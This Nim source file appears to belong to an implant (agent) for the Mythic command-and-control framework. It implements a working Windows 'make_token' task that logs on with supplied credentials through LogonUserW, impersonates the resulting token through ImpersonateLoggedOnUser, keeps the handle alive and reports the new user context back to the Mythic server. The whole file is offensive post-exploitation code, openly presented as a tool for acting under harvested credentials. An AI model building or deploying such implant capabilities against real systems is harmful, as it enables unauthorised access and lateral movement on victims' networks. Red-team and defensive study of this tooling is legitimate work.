import std/[json, strformat]
import ../utils/mythic_responses
import ../utils/debug
import token_manager

when defined(windows):
  import winim/lean
  
  proc makeToken*(taskId: string, params: JsonNode): JsonNode =
    ## Create a new logon token and impersonate it
    try:
      # Parse parameters
      let credential = params["credential"]
      let netOnly = params.getOrDefault("net_only").getBool(true)
      
      let username = credential["account"].getStr()
      let password = credential["credential"].getStr()
      let domain = credential.getOrDefault("realm").getStr(".")
      
      if username.len == 0:
        return mythicError(taskId, "Username cannot be empty")
      
      if password.len == 0:
        return mythicError(taskId, "Password cannot be empty")
      
      debug &"[DEBUG] make_token: user={domain}\\{username}, netOnly={netOnly}"
      
      # Convert strings to wide strings
      let usernameW = +$username
      let passwordW = +$password
      let domainW = +$domain
      
      var tokenHandle: HANDLE = 0
      
      # Determine logon type
      let logonType = if netOnly: LOGON32_LOGON_NEW_CREDENTIALS else: LOGON32_LOGON_INTERACTIVE
      let logonProvider = if netOnly: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
      
      # Log on user
      if LogonUserW(usernameW, domainW, passwordW, logonType.DWORD, logonProvider.DWORD, addr tokenHandle) == 0:
        let errorCode = GetLastError()
        return mythicError(taskId, &"Failed to log on user. Error code: {errorCode}")
      
      # Revert any existing impersonation
      if RevertToSelf() == 0:
        let errorCode = GetLastError()
        CloseHandle(tokenHandle)
        return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
      
      # Use ImpersonateLoggedOnUser for both logon types
      # This works better than DuplicateTokenEx and avoids error 1346
      if ImpersonateLoggedOnUser(tokenHandle) == 0:
        let errorCode = GetLastError()
        CloseHandle(tokenHandle)
        return mythicError(taskId, &"Failed to impersonate user. Error code: {errorCode}")
      
      # Store the token handle - we must keep it alive while impersonated
      setTokenHandle(tokenHandle)
      
      # Get the new user context (after impersonation)
      let newUser = getCurrentUsername()
      
      debug &"[DEBUG] Successfully impersonated: {newUser}"
      
      # Build response with callback data
      return mythicCallback(taskId, &"Successfully impersonated {newUser}", %*{
        "impersonation_context": newUser
      })
      
    except:
      let e = getCurrentException()
      return mythicError(taskId, &"make_token error: {e.msg}")

else:
  # Unix placeholder
  proc makeToken*(taskId: string, params: JsonNode): JsonNode =
    return mythicError(taskId, "make_token is only available on Windows")
